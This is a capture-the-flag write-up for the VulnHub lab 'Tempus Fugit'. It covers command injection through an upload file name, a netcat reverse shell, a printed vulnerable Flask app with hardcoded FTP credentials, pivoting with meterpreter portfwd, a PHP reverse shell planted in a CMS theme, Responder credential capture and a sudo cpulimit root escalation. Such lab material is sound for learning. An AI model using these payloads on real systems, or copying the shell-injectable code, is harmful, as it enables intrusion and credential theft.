Writeup for [Tempus Fugit](https://www.vulnhub.com/entry/tempus-fugit-1,346/) by [4ndr34z](https://twitter.com/4ndr34z) and [DCUA7](https://twitter.com/DCAU7).

# Foreword

This machine had a internal network/machine that was our real target and it teaches you about how reconnaisance can often lead you to the vulnerable machine in a network.

# Nmap

Starting off with nmap, scanning with `nmap -sV -sC -A -p- 192.168.43.224` which shows that we have only one port open i.e. 80 aka HTTP. So, let's check it.

# HTTP Enumeration 

Going to the HTTP port gives a good looking UI having a upload feature which will be saved to their internal FTP network of the machine. Now, let's try to upload something which might lead us to something nasty. But as a **sanity check** I tried to upload `.php` file but it only accepts `rtf` and `txt` files, since it wasn't a windows machine any kind of `rtf` related exploit would be pointless.
Next I tried to intercept the traffic via Burp Suite, now as we can see the contents which was being rendered and the file name field, so as a **sanity check** again, I added `file.txt;ls` to check it's listing the files from that folder or not, at this point [DCAU7](https://twitter.com/DCAU7) helped me. So, it was possible to do a command injection from the file field parameter, the command `nc < hexencodedIP port -e sh>` pointed out by the [DCAU7](https://twitter.com/DCAU7), probably WAF was preventing the standdard IP from being executed in the same order it was supposed to.

Starting the listener and executing that payload of ours, landed a reverse shell.

# First Network and FTP Enumeration

The real fun started from here. We gained the shell as the root user on the alpine linux.

Yup, we are done. Successfully pwned Tempus Fugit, pretty easy, right? Hold your horses, let's see what flag got for us, going to the `/root` folder which has a file named `message.txt` which say

>You're not done yet! :-)

So, we are not done, knew something was fishy. So, let's enumerate the system. On the folder where our reverse shell landed us, it had a `main.py` which had following contents:-

Remember when we were told that it has a internal FTP server which was storing our uploaded files, from which I knew that we have to gain access to that FTP server, using `nsftp` which was the FTP package of Alpine, so using that the crdentials from the following script script

```python
import os
import urllib.request
from flask import Flask, flash, request, redirect, render_template
from ftplib import FTP
import subprocess

UPLOAD_FOLDER = 'upload'
ALLOWED_EXTENSIONS = {'txt', 'rtf'}

app = Flask(__name__)
app.secret_key = "mofosecret"
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024



@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
      cmd = 'fortune -o'
      result = subprocess.check_output(cmd, shell=True)
      return "<h1>400 - Sorry. I didn't find what you where looking for.</h1> <h2>Maybe this will cheer you up:</h2><h3>"+result.decode("utf-8")+"</h3>"
@app.errorhandler(500)
def internal_error(error):
    return "<h1>500?! - What are you trying to do here?!</h1>"

@app.route('/')

def home():
	return render_template('index.html')
	

@app.route('/upload')

def upload_form():
	try:
	    return render_template('my-form.html')
	except Exception as e:
	    return render_template("500.html", error = str(e))


def allowed_file(filename):
           check = filename.rsplit('.', 1)[1].lower()
           check = check[:3] in ALLOWED_EXTENSIONS    
           return check

@app.route('/upload', methods=['POST'])
def upload_file():
	if request.method == 'POST':
		if 'file' not in request.files:
			flash('No file part')
			return redirect(request.url)
		file = request.files['file']
		if file.filename == '':
			flash('No file selected for uploading')
			return redirect(request.url)
		if file.filename and allowed_file(file.filename):
			filename = file.filename
			
			file.save(os.path.join(UPLOAD_FOLDER, filename))
			cmd="cat "+UPLOAD_FOLDER+"/"+filename
			result = subprocess.check_output(cmd, shell=True)
			flash(result.decode("utf-8"))
			flash('File successfully uploaded')
			
			try:
			   ftp = FTP('ftp.mofo.pwn')
			   ftp.login('someuser', 'b232a4da4c104798be4613ab76d26efda1a04606')
			   with open(UPLOAD_FOLDER+"/"+filename, 'rb') as f:
			      ftp.storlines('STOR %s' % filename, f)
			      ftp.quit()
			except:
			   flash("Cannot connect to FTP-server")
			return redirect('/upload')

		else:
			flash('Allowed file types are txt and rtf')
			return redirect(request.url)








if __name__ == "__main__":
    app.run()
```
Using the credentials we logged into the FTP server, and retrieved a file named `cmscreds.txt` which had crdentials for a Content Management Service, at this point I was so clueless since the directory traversal or forced directory search wasn't working with gobuster, uniscan and others. 

```bash
bash-4.4# cat cmscreds.txt
cat cmscreds.txt
Admin-password for our new CMS
hardEnough4u
```


I asked for some nudges from [mzfr](https://twitter.com/0xmzfr) and [DCUA](https://twitter.com/DCUA7), both of them told me about the internal network the machine has, having one of them as a target which we wanted to attack. Now, I checked the `/root` folder which has some files and other stuff and one of the files has some logs having a IP address `172.19.0.12` which could be the network we want to attack. 

![](/img/TempusFugit/logs.png)

But again I'm clueless, so I asked [4ndr34z](https://twitter.com/4ndr34z) who told me to check `/etc/resolv.conf` which had an entry for `mofo.pwn` which has to be enumertaed. I ran `dig mofo.pwn axfr` which showed me an interesting subdomain named `ourcms.mofo.pwn` on IP `172.19.0.1` which was my best bet of that time.

```bash
bash-4.4# apk fetch nmap
apk fetch nmap
Downloading nmap-7.60-r2

apk fetch nmap
bash-4.4# apk add nmap-7.60-r2.apk
apk add nmap-7.60-r2.apk
(1/1) Installing nmap (7.60-r2)
Executing busybox-1.27.2-r11.trigger
OK: 160 MiB in 81 packages
```

>Warning: The dig package was not installed on the machine, use `apk add bind-tools` to get the dig package.


# Stable Shell and Port Forwarding

As [mzfr](https://twitter.com/0xmzfr) told me that I might needed a stable shell to progress more, I used the metasploit's meterpreter shell in order to get the stable shell. For that, I first created a `shell.elf` with metasploit so we will create a callback from the shell to the meterpreter shell. 
I used a `linux/x86/reverse_tcp` in order to create a shell.

![](/img/TempusFugit/shellelf.png)

Now, let's get connect to the meterpreter shell:-

* First we need to configure to the reverse shell payload to `linux/x86/reverse_tcp` and set the required options i.e. LHOST and LPORT to their values.

![](/img/TempusFugit/metapayload.png)

* Then we need to transfer that `shell.elf` we have created earlier via HTTP port, use `python -m SimpleHTTPServer 1337` in the directory where `shell.elf` is.

![](/img/TempusFugit/localhttp.png)

* Now, once you get the `shell.elf` via wget, execute it but beforehand kill the nginx server from running processes via `kill < pid >` so that port fowarding could be done.

![](/img/TempusFugit/revshellexec.png)


* Now, `run` the metasploit multi handler exploit to connect back to reverse shell.

![](/img/TempusFugit/meterpretershell.png)

Once, connected it's time to use the metasploit's `portfwd` utility to forward the services running on `ourcms.mofo.pwn` to the other port of our hosts. 
Run `portfwd add -l 8080 -p 8080 -r 172.19.0.1` since, `ourcms.mofo.pwn` resides to the IP `172.19.0.1`, it'll bound the services to the host and service at port 8080. 

![](/img/TempusFugit/portfwd.png)
>Warning: Edit the `/etc/hosts` and add `ourcms.mofo.pwn` to the localhost, use `http://ourcms.mofo.pwn:port` to access the services.


##### Error: Port is in use

This might be a troubesome if you did the previous steps and messed up a little like I did.
Instead of using 8080 as the port, use any other which will work, though this can be a little tiresome at some point but it'll do the work since we've just stumbled upon the machine we wanted to attack.

# Content Managemnt Service and Reverse Shell

Now, we can access the services, let's log into the CMS already, going to the `/admin` route, we can sccess the admin panel, recalling what we got from the very first FTP server the credentials which was `admin:hardEnough4u` and we are logged in. As we are the admin, we can edit, create and do whatever we want to do to server. Now, edit the themes with pentestmonkey's PHP reverse shell and enter the content of it in `themes`, use the URL specified at the top of the editor and stat the listener to connect to the shell.

![](/img/TempusFugit/phpshell.png)

Once connected to the shell, I did some basic enumeration but somehow there wasn't any clue to leverage and we had lots of user. With some little help I used the wireshark and the Responder tool to get the password of the another user.
Just start the wireshark and start the responder in the background and continue enumerating your machine. After 5 minutes or so, I saw the responder output and it had the credentials for `gerianne` and password `barbie`.

![](//img/TempusFugit/geeklocalpass.png)

Using those credentials, I leveraged upto user gerianne.

![](/img/TempusFugit/gerianne.png)

While I was eumerating the machine I found that there was a email in `/var/mail` for user gerianne. Now, since we have access to it, let's see what it has:

![](/img/TempusFugit/mail.png)

User merry has given us the password via mail, which was `merry:9a4lw0r82mj8` now we can leverage upto the user merry. Let's get to the root now, probably?

##### User Flag

As user gerianne, I found the user flag in it's home directory.

![](/img/TempusFugit/userflag.png)

# Root

As usual, trying `sudo -l` showed that I can use `cpulimit` binary as sudo.

![](/img/TempusFugit/sudol.png)

Going over [gtfobins](https://gtfobins.github.io/gtfobins/cpulimit/#sudo) I found that doing `sudo cpulimit -l 100 -f /bin/sh` made us root.
